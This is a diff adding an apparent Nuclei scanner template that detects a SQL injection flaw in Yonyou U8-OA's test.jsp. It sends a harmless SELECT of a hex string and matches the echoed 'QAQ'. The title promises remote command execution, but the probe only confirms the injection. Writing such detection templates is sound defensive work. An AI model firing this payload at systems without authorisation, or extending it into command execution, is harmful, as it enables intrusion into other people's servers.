@@ -1,0 +1,27 @@
+id: yonyou-u8-oa-test-rce
+
+info:
+  name: Yonyou U8-OA test.jsp RCE with SQLi
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Exploits a remote code execution vulnerability in Yonyou U8-OA's test.jsp via SQL injection, allowing attackers to execute arbitrary commands.
+  tags: rce, sqli
+  reference:
+    - https://www.cnblogs.com/AtesetEnginner/p/12106741.html
+
+http:
+  - raw:
+      - |
+        GET /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%200x514151) HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "0x514151"
+      - type: word
+        part: body
+        words:
+          - "QAQ"
